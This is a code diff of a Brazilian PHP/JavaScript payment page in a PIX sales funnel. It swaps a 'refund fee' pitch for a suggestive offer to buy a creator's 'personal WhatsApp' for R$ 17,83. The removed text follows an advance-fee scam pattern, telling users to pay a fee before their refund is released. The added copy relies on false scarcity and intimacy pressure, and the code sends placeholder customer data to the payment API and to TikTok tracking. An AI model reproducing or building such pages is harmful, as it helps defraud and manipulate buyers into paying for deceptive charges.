@@ -108,13 +108,13 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     </nav>
 
     <div id="ad1">
-        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Taxa de Reembolso</p>
+        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Meu WhatsApp Pessoal</p>
 
         <div class="ad1">
             <div style="margin-left: 3%; margin-right: 3%;">
                 <button class="styled-button">
                     <div class="icon-container" style="background-color: #f4f4f4; padding: 10px; border-radius: 50%;"> <!-- Mudança feita aqui -->
-                        <span class="material-symbols-outlined" style="font-size: 42px; color: #b42318;">shield_lock</span>
+                        <span class="material-symbols-outlined" style="font-size: 42px; color: #25d366;">chat</span>
                     </div>
                     <span class="button-text">
                         <span class="button-title">Conta Privacy: #5972</span>
@@ -130,7 +130,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                             <span class="material-symbols-outlined">check</span>
                         </div>
                         <div class="text-container">
-                            <div class="entrega-title">Pagamento principal confirmado</div>
+                            <div class="entrega-title">Chamada de Vídeo agendada ✓</div>
                         </div>
                     </div>
                     <div class="entrega-content">
@@ -138,18 +138,18 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                             <span class="material-symbols-outlined">warning</span>
                         </div>
                         <div class="text-container">
-                            <div class="entrega-title">Taxa de reembolso pendente</div>
+                            <div class="entrega-title">Meu WhatsApp pessoal te esperando 📲</div>
                         </div>
                     </div>
                 </div>
 
-                <p class="security-note" style="text-align: center; margin-left: 3%; margin-right: 3%;">Para liberar a solicitação, regularize a Taxa de Reembolso.</p>
+                <p class="security-note" style="text-align: center; margin-left: 3%; margin-right: 3%;">📱 Aqui eu paro de ser ícone na tela e viro REAL. Você ganha MEU WhatsApp pra falar comigo direto — do mesmo jeito que falo com minhas top assinantes. Bom dia, áudio safado, foto que ninguém vê.</p>
                 <div style="text-align: center;"><span class="security-price"><small>Valor único</small><strong>R$ 17,83</strong></span></div>
 
                 <div class="button-container" style="padding-bottom: 20px;">
                     <button class="styled-button2" onclick="generatePixPayment(event)">
                         <span class="button-text">
-                            <span class="button-title2">Regularizar agora</span>
+                            <span class="button-title2">📱 Quero seu WhatsApp</span>
                         </span>
                         <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
                     </button>
@@ -159,7 +159,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     </div>
 
     <div id="ad2" style="display: none;">
-        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Taxa de Reembolso</p>
+        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Meu WhatsApp Pessoal</p>
 
         <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
             <div style="padding-top: 2px;"></div>
@@ -189,7 +189,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         <span class="material-symbols-outlined">warning</span>
                     </div>
                     <div class="text-container">
-                        <div class="entrega-title">Taxa de reembolso ainda pendente.</div>
+                        <div class="entrega-title">Vaga ainda disponível — mas é por ordem de chegada 📱</div>
                     </div>
                 </div>
             </div>
@@ -204,7 +204,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
                     </div>
                     <div class="text-container">
-                        <div class="entrega-title" style="color: white">Para liberar o processamento, é necessário pagar a Taxa de Reembolso. Valor único: R$ 17,83.</div>
+                        <div class="entrega-title" style="color: white">🔥 Pouquíssimas pessoas têm meu zap, amor. Por R$ 17,83 você entra nesse círculo fechado — e nunca mais sai 😈</div>
                     </div>
                 </div>
             </div>
@@ -212,7 +212,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
                 <button onclick="generatePixPayment(event)" class="styled-button2">
                     <span class="button-text">
-                            <span class="button-title2">Pagar R$ 17,83</span>
+                            <span class="button-title2">📱 Liberar WhatsApp por R$ 17,83</span>
                     </span>
                     <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
                 </button>
@@ -233,9 +233,9 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     <script src="/tiktok-tracking.js"></script>
 
     <script>
-        document.body.dataset.step = "taxa_reembolso";
+        document.body.dataset.step = "whatsapp_pessoal";
 
-        // Sistema de PIX para taxa de reembolso
+        // Sistema de PIX para WhatsApp Pessoal
         const PIX_API_BASES = (() => {
             const bases = [];
             const add = (base) => {
@@ -284,7 +284,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
 
         function postPixCreate(payload) {
             return fetchJsonFallback(
-                ["/pix-create.php", "/api/pix/create.php", "/api/pix/create", "/.netlify/functions/pix-create"],
+                ["/api/pix/create", "/api/pix/create.php", "/pix-create.php", "/.netlify/functions/pix-create"],
                 {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -298,7 +298,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             const encodedId = encodeURIComponent(paymentId);
             const query = identifier ? `?identifier=${encodeURIComponent(identifier)}` : "";
             return fetchJsonFallback(
-                [`/pix-status.php?id=${encodedId}`, `/api/pix/status.php?id=${encodedId}`, `/api/pix/${encodedId}${query}`],
+                [`/api/pix/${encodedId}${query}`, `/api/pix/status.php?id=${encodedId}`, `/pix-status.php?id=${encodedId}`],
                 {
                     method: "GET",
                     headers: { "Content-Type": "application/json", "Accept": "application/json" },
@@ -371,12 +371,12 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     phone: "11999999999",
                     document: "12345678901"
                 };
-                console.log("👤 Dados do cliente para taxa de reembolso:", clientData);
+                console.log("👤 Dados do cliente para WhatsApp Pessoal:", clientData);
 
-                // Dados para o PIX da taxa de reembolso (formato NivusPay)
+                // Dados para o PIX da WhatsApp Pessoal (formato NivusPay)
                 const pixData = {
                     "amount": 17.83, // R$ 17,83
-                    "description": "Taxa de Reembolso",
+                    "description": "Meu WhatsApp Pessoal",
                     "paymentMethod": "pix",
                     "customer": {
                         "name": clientData.name,
@@ -389,21 +389,21 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     },
                     "items": [
                         {
-                            "title": "Taxa de Reembolso",
+                            "title": "Meu WhatsApp Pessoal",
                             "quantity": 1,
                             "unitPrice": 1783, // R$ 17,83 em centavos
                             "tangible": false,
-                            "externalRef": "taxa_reembolso"
+                            "externalRef": "whatsapp_pessoal"
                         }
                     ],
-                    "externalRef": "taxa_reembolso_" + Date.now(),
-                    "external_id": "taxa_reembolso_" + Date.now()
+                    "externalRef": "whatsapp_pessoal_" + Date.now(),
+                    "external_id": "whatsapp_pessoal_" + Date.now()
                 };
 
-                console.log("📦 Dados preparados para taxa de reembolso:", pixData);
+                console.log("📦 Dados preparados para WhatsApp Pessoal:", pixData);
 
                 if (window.nicoleTikTok) {
-                    window.nicoleTikTok.trackCheckout({ content_id: "taxa_reembolso", content_name: "Taxa de Reembolso", value: 17.83, order_id: pixData.external_id, event_id: "InitiateCheckout_" + pixData.external_id, customer: clientData });
+                    window.nicoleTikTok.trackCheckout({ content_id: "whatsapp_pessoal", content_name: "Meu WhatsApp Pessoal", value: 17.83, order_id: pixData.external_id, event_id: "InitiateCheckout_" + pixData.external_id, customer: clientData });
                 }
 
                 const result = await postPixCreate(pixData);
@@ -414,7 +414,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                 const pixCode = normalizedPix.code;
 
                 if (transactionId && pixCode) {
-                    console.log("✅ PIX taxa de reembolso gerado com sucesso");
+                    console.log("✅ PIX WhatsApp Pessoal gerado com sucesso");
 
                     // Mapear resposta NivusPay para formato esperado
                     const payment = {
@@ -431,10 +431,10 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     };
 
                     // Salvar ID da NivusPay para verificação posterior
-                    localStorage.setItem("nivuspay_transaction_id_taxa_reembolso", transactionId);
+                    localStorage.setItem("nivuspay_transaction_id_whatsapp_pessoal", transactionId);
 
                     if (window.nicoleTikTok) {
-                        window.nicoleTikTok.trackPixGenerated({ content_id: "taxa_reembolso", content_name: "Taxa de Reembolso", value: 17.83, order_id: transactionId, event_id: "AddPaymentInfo_" + transactionId, customer: clientData });
+                        window.nicoleTikTok.trackPixGenerated({ content_id: "whatsapp_pessoal", content_name: "Meu WhatsApp Pessoal", value: 17.83, order_id: transactionId, event_id: "AddPaymentInfo_" + transactionId, customer: clientData });
                     }
 
                     showPixModal(payment);
@@ -464,7 +464,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     <div style="background:linear-gradient(135deg,#ff633d,#ff875e);color:#fff;text-align:center;padding:24px 22px 18px;">
                         <h2 style="font-size:20px;line-height:1.2;margin:0 0 6px;font-weight:800;color:#fff;">Escaneie o QR Code</h2>
                         <p style="font-size:15px;margin:0 0 9px;color:#fff;">Ou copie o código PIX abaixo</p>
-                        <div style="display:inline-flex;align-items:center;justify-content:center;min-height:26px;padding:4px 14px;border-radius:999px;background:rgba(255,255,255,.24);font-size:14px;font-weight:800;color:#fff;">Taxa de Reembolso - R$ ${payment.amount ? payment.amount.toFixed(2).replace('.', ',') : '17,83'}</div>
+                        <div style="display:inline-flex;align-items:center;justify-content:center;min-height:26px;padding:4px 14px;border-radius:999px;background:rgba(255,255,255,.24);font-size:14px;font-weight:800;color:#fff;">Meu WhatsApp Pessoal - R$ ${payment.amount ? payment.amount.toFixed(2).replace('.', ',') : '17,83'}</div>
                     </div>
                     <div style="padding:21px 20px 22px;">
                         <div id="qr-code-container" style="display:flex;justify-content:center;margin-bottom:13px;">
@@ -490,11 +490,11 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             paymentModal.classList.remove("hidden");
 
             // Salvar dados do PIX no localStorage
-            localStorage.setItem("currentPixTaxaReembolso", JSON.stringify({
+            localStorage.setItem("currentPixWhatsApp", JSON.stringify({
                 payment,
                 tracking: {
-                    content_id: "taxa_reembolso",
-                    content_name: "Taxa de Reembolso",
+                    content_id: "whatsapp_pessoal",
+                    content_name: "Meu WhatsApp Pessoal",
                     value: 17.83,
                     order_id: payment.payment_code,
                     event_id: "CompletePayment_" + payment.payment_code,
@@ -532,7 +532,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             qrContainer.innerHTML = '<div class="text-xs text-blue-500">Carregando QR Code...</div>';
 
             // Obter o código PIX do localStorage
-            const currentPix = localStorage.getItem('currentPixTaxaReembolso');
+            const currentPix = localStorage.getItem('currentPixWhatsApp');
             if (!currentPix) {
                 qrContainer.innerHTML = '<div class="text-xs text-red-500">Dados PIX não encontrados</div>';
                 return;
@@ -586,7 +586,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
 
         function showQRCodeFallback() {
             const qrContainer = document.getElementById('qrcode');
-            const currentPix = localStorage.getItem('currentPixTaxaReembolso');
+            const currentPix = localStorage.getItem('currentPixWhatsApp');
             
             if (!currentPix) {
                 qrContainer.innerHTML = '<div class="text-xs text-red-500">Dados PIX não encontrados</div>';
@@ -680,7 +680,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
         let paymentCheckInterval = null;
         
         function startAutomaticPaymentCheck(paymentCode) {
-            console.log("🔄 Iniciando verificação automática do pagamento da taxa de reembolso...");
+            console.log("🔄 Iniciando verificação automática do pagamento da WhatsApp Pessoal...");
             
             // Verificar a cada 10 segundos
             paymentCheckInterval = setInterval(async () => {
@@ -710,12 +710,12 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
         
         // Função interna para verificar status (usada tanto pelo automático quanto pelo botão)
         async function checkPaymentStatusInternal(paymentCode, isAutomatic = false) {
-            const nivuspayId = localStorage.getItem("nivuspay_transaction_id_taxa_reembolso") || paymentCode;
+            const nivuspayId = localStorage.getItem("nivuspay_transaction_id_whatsapp_pessoal") || paymentCode;
             
-            console.log(`🔍 ${isAutomatic ? 'Verificação automática' : 'Verificação manual'} do pagamento da taxa de reembolso:`, nivuspayId);
+            console.log(`🔍 ${isAutomatic ? 'Verificação automática' : 'Verificação manual'} do pagamento da WhatsApp Pessoal:`, nivuspayId);
             
             // Buscar o identifier do localStorage se disponível
-            const currentPix = localStorage.getItem("currentPixTaxaReembolso");
+            const currentPix = localStorage.getItem("currentPixWhatsApp");
             let identifier = '';
             if (currentPix) {
                 const pixData = JSON.parse(currentPix);
@@ -723,14 +723,14 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             }
             
             const result = await getPixStatus(nivuspayId, identifier);
-            console.log("📊 Status da transação da taxa de reembolso:", result);
+            console.log("📊 Status da transação da WhatsApp Pessoal:", result);
 
             // Verificar se o pagamento foi confirmado
             const statusRaw = String(result.status || result.data?.status || "").toUpperCase();
             const isPaid = result.isPaid === true || result.paid === true || ["PAID", "APPROVED", "CONFIRMED", "COMPLETED"].includes(statusRaw);
 
             if (isPaid) {
-                console.log("✅ Pagamento da taxa de reembolso confirmado!");
+                console.log("✅ Pagamento da WhatsApp Pessoal confirmado!");
                 
                 // Parar verificação automática
                 stopAutomaticPaymentCheck();
@@ -738,10 +738,10 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     const paidEventId = "CompletePayment_" + nivuspayId;
                     let paidCustomer = {};
                     try {
-                        const paidPix = JSON.parse(localStorage.getItem("currentPixTaxaReembolso") || "{}");
+                        const paidPix = JSON.parse(localStorage.getItem("currentPixWhatsApp") || "{}");
                         paidCustomer = (paidPix && paidPix.payment && paidPix.payment.customer) || {};
                     } catch (error) {}
-                    window.nicoleTikTok.trackPaymentConfirmed({ content_id: "taxa_reembolso", content_name: "Taxa de Reembolso", value: 17.83, order_id: nivuspayId, event_id: paidEventId, customer: paidCustomer });
+                    window.nicoleTikTok.trackPaymentConfirmed({ content_id: "whatsapp_pessoal", content_name: "Meu WhatsApp Pessoal", value: 17.83, order_id: nivuspayId, event_id: paidEventId, customer: paidCustomer });
                 }
                 
                 // Redirecionar para up2 pm
@@ -749,7 +749,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                 return;
             } else {
                 const status = result.status || 'unknown';
-                console.log(`⏳ Status atual da taxa de reembolso: ${status}`);
+                console.log(`⏳ Status atual da WhatsApp Pessoal: ${status}`);
                 
                 // Se não for automático, mostrar mensagem para o usuário
                 if (!isAutomatic) {
